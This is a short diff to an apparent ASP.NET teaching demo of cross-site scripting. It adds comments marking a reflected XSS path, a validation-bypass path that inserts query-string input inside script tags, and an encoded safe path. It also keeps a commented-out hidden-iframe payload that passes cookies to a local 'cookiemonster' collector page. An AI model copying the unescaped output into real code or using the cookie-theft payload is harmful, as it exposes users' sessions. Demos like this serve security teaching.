@@ -18,6 +18,7 @@ namespace CrossSiteScripting
 
             FakeCookies();
             string strQs = string.Empty;
+            //Reflexive XSS
             if (Request.QueryString["strErr"] != null)
             {
                 strQs = Request.QueryString["strErr"] as string;
@@ -25,11 +26,13 @@ namespace CrossSiteScripting
                 //lblDisplayErr.Text = "<script> var s = '<IFRAME style = \"display:none\" SRC = \"http://localhost:62460/cookiemonster.aspx?c=test\" ></ IFRAME > ';document.write(s)</script>";
 
             }
+            //Reflexive XSS bypass validate request
             if (Request.QueryString["strErr2"] != null)
             {
                 strQs = Request.QueryString["strErr2"] as string;
                 lblDisplayErr.Text = "<script>"+strQs+"</script>";
             }
+            //Stop XSS attack by encoding
             if (Request.QueryString["strErr3"] != null)
             {
                 strQs = Request.QueryString["strErr3"] as string;
@@ -59,7 +62,7 @@ namespace CrossSiteScripting
 
             }
 
-            //create cookies
+            //Create cookies to steal!
             void FakeCookies()
             {
                 Response.Cookies["name"].Value = "Kyle";
